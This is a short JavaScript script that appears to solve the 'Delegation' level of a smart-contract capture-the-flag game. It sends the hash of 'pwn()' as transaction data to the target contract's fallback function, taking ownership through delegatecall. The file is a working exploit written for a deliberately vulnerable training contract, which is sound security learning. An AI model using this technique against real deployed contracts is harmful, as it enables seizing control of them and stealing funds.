const loader = require('../loader.js')
const web3 = require('../web3.js')
const instance = require('../prompt.js');

// first deploy HackCoinFlip with (npx oz deploy)
(async () => {
  try {
    const victim = loader.truffle.fromArtifact('Delegation', instance)
    console.log('Compute msg.data hash')
    const hash = web3.utils.keccak256('pwn()')
    console.log(hash)
    console.log('Send msg.data to fallback function...')
    await victim.sendTransaction({ data: hash })
    console.log('Done. You can submit your instance.')
  } catch (err) {
    console.log(err.message)
  }
})()
